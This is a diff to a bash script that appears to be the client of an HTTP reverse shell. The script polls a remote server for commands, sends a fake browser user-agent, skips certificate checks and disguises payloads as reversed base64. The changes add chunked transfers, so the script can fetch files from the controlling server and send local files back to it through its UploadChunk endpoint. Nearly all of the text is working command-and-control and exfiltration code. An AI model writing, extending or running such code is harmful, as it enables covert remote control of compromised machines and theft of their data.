@@ -9,6 +9,7 @@ server="$2"
 sleeps="$4"
 pwdnew="$(echo $PWD)"
 cagent="Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"
+chunk_size=65536
 
 # Help
 if [[ $1 == *-h* ]] || [[ -z $2 ]]; then
@@ -42,9 +43,18 @@ R64Decoder() {
       elif [ "$base64_len" -eq 3 ]; then
          base64+="="
       fi
-   fi   
-   revb64=$(echo "$base64" | base64 -d)
-   echo "$revb64"
+      revb64=$(echo "$base64" | base64 -d)
+      echo "$revb64"
+   elif [ "$1" = "-f" ]; then
+      base64=$(echo -n "$2" | rev | tr "-" "+" | tr "_" "/" )
+      base64_len=$(( ${#base64} % 4 ))
+      if [ "$base64_len" -eq 2 ]; then
+         base64+="=="
+      elif [ "$base64_len" -eq 3 ]; then
+         base64+="="
+      fi
+      echo "$base64" | base64 -d
+   fi
 }
 
 # Main
@@ -66,18 +76,61 @@ while true; do
 
       if [[ $invoke64 == upload* ]]; then
          file_path="${invoke64#upload }"
-         file_path=$(echo $file_path | cut -d "!" -f 2)
-         file_request=$(curl --max-time 600 -A "$cagent" -s -k -X GET "$server/api/v1/Client/Download")
-         file_content=$(echo "$file_request" | grep "File: " | cut -d ' ' -f2)
-         R64Decoder -t "$file_content" > "$file_path"
+         file_path=$(echo "$file_path" | cut -d "!" -f 2)
+         chunk_index=0
+         tmpfile="/tmp/http-shell-upload-$$.tmp"
+         : > "$tmpfile"
+         while true; do
+            file_request=$(curl --max-time 600 -A "$cagent" -s -k -X GET "$server/api/v1/Client/DownloadChunk?index=$chunk_index")
+            if [[ $file_request == "FileChunkDone" ]]; then
+               break
+            fi
+            if [[ $file_request == FileChunk:* ]]; then
+               chunk_data="${file_request#FileChunk:}"
+               is_last=$(echo "$chunk_data" | cut -d ':' -f2)
+               chunk_payload=$(echo "$chunk_data" | cut -d ':' -f3-)
+               printf '%s' "$chunk_payload" >> "$tmpfile"
+               if [[ $is_last == "1" ]]; then
+                  break
+               fi
+               chunk_index=$((chunk_index + 1))
+            else
+               break
+            fi
+         done
+         if [[ ! -s "$tmpfile" ]]; then
+            : > "$file_path"
+         else
+            rev < "$tmpfile" | tr "-" "+" | tr "_" "/" | base64 -d > "$file_path"
+         fi
+         rm -f "$tmpfile"
          unset invoke64 ; unset commandx
       fi
 
       if [[ $invoke64 == download* ]]; then
          file_path="${invoke64#download }"
-         file_path=$(echo $file_path | cut -d "!" -f 1)
-         file_content=$(R64Encoder -f "$file_path")
-         download=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/Upload" -d "File: $file_content")
+         file_path=$(echo "$file_path" | cut -d "!" -f 1)
+         tmpfile="/tmp/http-shell-dl-$$.b64"
+         if R64Encoder -f "$file_path" | tr -d '\n' > "$tmpfile"; then
+            content_len=$(wc -c < "$tmpfile")
+            if [ "$content_len" -eq 0 ]; then
+               download=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/UploadChunk" -d "Chunk:0:1:")
+            else
+               chunk_index=0
+               offset=0
+               while [ "$offset" -lt "$content_len" ]; do
+                  chunk_payload=$(dd if="$tmpfile" bs="$chunk_size" skip="$chunk_index" count=1 2>/dev/null)
+                  is_last=0
+                  if [ $((offset + chunk_size)) -ge "$content_len" ]; then
+                     is_last=1
+                  fi
+                  download=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/UploadChunk" -d "Chunk:$chunk_index:$is_last:$chunk_payload")
+                  chunk_index=$((chunk_index + 1))
+                  offset=$((offset + chunk_size))
+               done
+            fi
+         fi
+         rm -f "$tmpfile"
          unset invoke64 ; unset commandx
       fi
 
